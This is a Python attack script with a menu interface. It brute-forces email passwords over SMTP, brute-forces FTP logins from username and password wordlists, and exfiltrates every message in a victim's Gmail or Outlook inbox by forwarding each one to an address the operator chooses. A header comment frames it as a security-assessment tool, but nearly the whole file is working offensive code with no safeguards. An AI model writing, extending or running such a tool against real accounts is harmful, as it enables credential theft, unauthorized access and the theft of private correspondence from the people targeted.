#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 6th 2024
# Description of the Script:
# The script is a versatile tool designed to facilitate various email-related tasks and FTP 
# brute-force attacks. It features a user-friendly menu interface that allows users to choose 
# from several options. These options include sending test emails, exfiltrating emails from Gmail 
# accounts, and brute-forcing FTP servers. The script prompts users for necessary details such as
# SMTP server settings, email addresses, and passwords, enabling seamless execution of chosen tasks.
# Additionally, it has been enhanced to ensure exfiltrated emails are sent to a specified local host
# email address, ensuring efficient and centralized management of retrieved data. Overall, the script
# offers a comprehensive solution for email-related operations and FTP security assessments.
#################################################################################################
import smtplib
import imaplib
import time
import win32com.client  # Only for Windows environment
import ftplib
import os

# Function to send plain text email
def plain_email(subject, contents):
    """
    Sends a plain text email.

    Args:
    subject (str): The subject of the email.
    contents (str): The body of the email.
    """
    # Construct the email message
    message = f'Subject: {subject}\nFrom: {smtp_acct}\n'
    message += f'To: {", ".join(tgt_accts)}\n\n{contents}'
    
    # Connect to SMTP server and send the email
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_passwd)
    server.sendmail(smtp_acct, tgt_accts, message)
    
    # Sleep briefly before quitting the server
    time.sleep(1)
    server.quit()

# Function to brute force email account passwords
def brute_force_password(email):
    """
    Brute forces passwords for a given email account.

    Args:
    email (str): The email address to brute force.

    Returns:
    str: The found password, if successful; otherwise, None.
    """
    passwords = ['password1', 'password2', 'password3']  # Add more passwords for brute force
    for password in passwords:
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(email, password)
            server.quit()
            return password
        except smtplib.SMTPAuthenticationError:
            continue
    return None

# Function to exfiltrate emails from a Gmail account
def exfiltrate_gmail(email, password):
    """
    Exfiltrates emails from a Gmail account.

    Args:
    email (str): The Gmail address.
    password (str): The password for the Gmail account.
    """
    # Connect to Gmail IMAP server
    imap_server = "imap.gmail.com"
    mail = imaplib.IMAP4_SSL(imap_server)
    mail.login(email, password)
    mail.select('inbox')
    
    # Fetch all email IDs in the inbox
    result, data = mail.search(None, 'ALL')
    email_ids = data[0].split()
    
    # Fetch and send each email
    for email_id in email_ids:
        result, data = mail.fetch(email_id, "(RFC822)")
        raw_email = data[0][1]
        plain_email('Exfiltrated Email', raw_email)
    
    # Close connection
    mail.close()
    mail.logout()

# Function to exfiltrate emails from an Outlook account (Windows only)
def exfiltrate_outlook():
    """
    Exfiltrates emails from an Outlook account (Windows only).
    """
    # Connect to Outlook
    outlook = win32com.client.Dispatch("Outlook.Application")
    namespace = outlook.GetNamespace("MAPI")
    folder = namespace.Folders[1].Folders['Inbox']
    messages = folder.Items
    
    # Fetch and send each email
    for message in messages:
        plain_email('Exfiltrated Outlook Email', message.Body)

# Function to brute force FTP server with given usernames and passwords
def brute_force_ftp(username_dict_path, password_dict_path, ftp_server):
    """
    Brute forces FTP server using provided username and password dictionaries.

    Args:
    username_dict_path (str): Path to the file containing usernames.
    password_dict_path (str): Path to the file containing passwords.
    ftp_server (str): FTP server address.
    """
    with open(username_dict_path) as users_file:
        usernames = users_file.read().splitlines()
    with open(password_dict_path) as passwords_file:
        passwords = passwords_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP(ftp_server)
                ftp.login(username, password)
                ftp.quit()
                return username, password
            except ftplib.error_perm:
                continue
    return None, None

# Interactive menu function
def menu():
    # Display menu options
    print("Choose an option:")
    print("1. Send a test email")
    print("2. Brute force an email password")
    print("3. Exfiltrate emails from a Gmail account")
    print("4. Exfiltrate emails from an Outlook account (Windows only)")
    print("5. Brute force FTP server")
    print("6. Exit")

if __name__ == '__main__':
    # User inputs for email server details
    smtp_input = input("Please enter the server URL address here: ")
    smtp_server = smtp_input
    smtp_port = 587
    acct_input = input("Please enter the account address here: ")
    smtp_acct = acct_input
    passwd_input = input("Please input the account password here: ")
    smtp_passwd = passwd_input
    trgt_addr_input = input("Please enter the target account address here: ")
    tgt_accts = [trgt_addr_input]

    # Interactive menu loop
    while True:
        menu()  # Display menu
        option = input("Option: ")  # Prompt user for option

        if option == '1':  # Option to send a test email
            sub_input = input("Please enter Test Subject Line here: ")
            content_input = input("Please enter email content here: ")
            plain_email(f'{sub_input}', f'{content_input}')
        elif option == '2':  # Option to brute force an email password
            brute_force_email = input("Please enter the email address to brute force: ")
            brute_force_result = brute_force_password(brute_force_email)
            if brute_force_result:
                print(f"Password found: {brute_force_result}")
            else:
                print("Password not found.")
        elif option == '3':  # Option to exfiltrate emails from a Gmail account
            gmail_exfil_email = input("Please enter the Gmail address to exfiltrate emails from: ")
            gmail_password = input("Please enter the password for the Gmail account: ")
            exfiltrate_gmail(gmail_exfil_email, gmail_password)
        elif option == '4':  # Option to exfiltrate emails from an Outlook account (Windows only)
            exfiltrate_outlook()
        elif option == '5':  # Option to brute force FTP server
            ftp_server = input("Please enter FTP server address: ")
              # Prompt for the path to username and password dictionaries
            username_dict_path = input("Please enter the path to the username dictionary: ")
            password_dict_path = input("Please enter the path to the password dictionary: ")

            # Perform FTP brute force
            username, password = brute_force_ftp(username_dict_path, password_dict_path, ftp_server)
            if username and password:
                print(f"FTP credentials found: Username - {username}, Password - {password}")
            else:
                print("FTP credentials not found.")
        elif option == '6':  # Option to exit the script
            print("Exiting...")
            break
        else:
            print("Invalid option. Please try again.")



